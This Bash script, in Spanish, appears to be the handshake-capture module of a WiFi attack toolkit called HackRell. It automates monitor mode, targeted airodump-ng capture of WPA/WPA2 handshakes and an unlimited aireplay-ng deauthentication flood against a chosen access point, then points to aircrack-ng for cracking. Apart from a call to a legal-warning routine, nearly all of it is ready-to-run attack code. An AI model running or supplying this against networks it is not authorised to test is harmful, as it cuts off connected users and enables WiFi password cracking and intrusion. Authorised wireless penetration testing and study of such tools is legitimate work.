#!/bin/bash

# HackRell - wifi/wifi_capture.sh
# Captura handshakes WPA/WPA2 utilizando airodump-ng y aireplay-ng.

# Cargar utilidades de color y legal
source "$(dirname "$0")"/../utils/colors.sh
source "$(dirname "$0")"/../utils/legal.sh

# Directorio para logs y capturas
LOG_DIR="/var/log/hackrell"
mkdir -p "$LOG_DIR" # Asegurarse de que el directorio de logs existe

# Importar funciones de modo monitor desde wifi_scan.sh
source "$(dirname "$0")"/wifi_scan.sh

function wifi_capture_menu() {
    check_root
    display_legal_warning
    clear
    print_banner "MÓDULO DE CAPTURA WIFI (HANDSHAKES)"
    echo ""
    print_info "Este módulo le ayudará a capturar handshakes WPA/WPA2."
    print_warning "Requiere un adaptador WiFi compatible con modo monitor y los permisos adecuados."
    echo ""

    local iface_selected=$(select_wifi_interface)
    if [ -z "$iface_selected" ]; then
        print_error "No se pudo seleccionar una interfaz WiFi. Volviendo al menú principal."
        sleep 3
        return 1
    fi

    start_monitor_mode "$iface_selected"
    if [ $? -ne 0 ]; then
        print_error "No se pudo iniciar el modo monitor. Volviendo al menú principal."
        sleep 3
        return 1
    fi

    print_info "Escaneando redes para identificar objetivos. Presione CTRL+C para detener el escaneo."
    print_info "Los resultados se mostrarán en tiempo real."
    echo ""

    # Iniciar airodump-ng en segundo plano para escanear APs y clientes
    xterm -e "airodump-ng $iface_selected" &
    local airodump_pid=$!

    print_info "Airodump-ng está escaneando en una nueva ventana. Identifique el BSSID y el canal del AP objetivo."
    print_info "Cierre la ventana de airodump-ng cuando haya identificado el objetivo y presione [ENTER] aquí."
    read -r

    # No es necesario matar airodump_pid aquí si el usuario lo cierra manualmente
    # kill $airodump_pid 2>/dev/null
    # wait $airodump_pid 2>/dev/null

    echo ""
    read -p "${C_GREEN}Ingrese el BSSID del AP objetivo (ej: AA:BB:CC:DD:EE:FF): ${C_RESET}" target_bssid
    read -p "${C_GREEN}Ingrese el canal del AP objetivo (ej: 6): ${C_RESET}" target_channel
    read -p "${C_GREEN}Ingrese el nombre del archivo para guardar la captura (ej: handshake_capture): ${C_RESET}" capture_file_name

    if [ -z "$target_bssid" ] || [ -z "$target_channel" ] || [ -z "$capture_file_name" ]; then
        print_error "Todos los campos son obligatorios. Volviendo al menú principal."
        stop_monitor_mode "$iface_selected"
        sleep 3
        return 1
    fi

    local full_capture_path="${LOG_DIR}/${capture_file_name}"

    print_info "Iniciando captura de handshake para BSSID: $target_bssid en canal $target_channel."
    print_info "La captura se guardará en ${full_capture_path}-01.cap"
    echo ""

    # Iniciar airodump-ng en el canal y BSSID específicos para capturar el handshake en una nueva ventana
    xterm -e "airodump-ng -c $target_channel --bssid $target_bssid -w $full_capture_path $iface_selected" &
    local airodump_capture_pid=$!

    print_info "Airodump-ng está capturando en una nueva ventana. Ahora intentaremos forzar un handshake con un ataque de deautenticación."
    print_info "Presione [ENTER] para iniciar el ataque de deautenticación (o CTRL+C para omitir)."
    read -r

    # Ataque de deautenticación para forzar el handshake en una nueva ventana
    print_info "Iniciando ataque de deautenticación con aireplay-ng..."
    xterm -e "aireplay-ng --deauth 0 -a $target_bssid $iface_selected" &
    local aireplay_pid=$!

    print_info "Deautenticación en curso en una nueva ventana. Espere unos segundos para que se capture el handshake."
    print_info "Cuando vea el mensaje de handshake capturado en la ventana de airodump-ng, cierre ambas ventanas y presione [ENTER] aquí."
    read -r

    # No es necesario matar los PIDs aquí si el usuario los cierra manualmente
    # kill $aireplay_pid 2>/dev/null
    # kill $airodump_capture_pid 2>/dev/null
    # wait $aireplay_pid 2>/dev/null
    # wait $airodump_capture_pid 2>/dev/null

    print_success "Captura y ataque de deautenticación detenidos (asumiendo que las ventanas fueron cerradas)."
    print_info "Verifique el archivo ${full_capture_path}-01.cap para el handshake capturado."
    print_info "Puede usar aircrack-ng para verificar si se capturó un handshake: aircrack-ng ${full_capture_path}-01.cap"
    echo ""
    print_info "Presione [ENTER] para continuar."
    read -r

    stop_monitor_mode "$iface_selected"
}

# Llamar a la función principal si el script se ejecuta directamente
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    wifi_capture_menu
fi

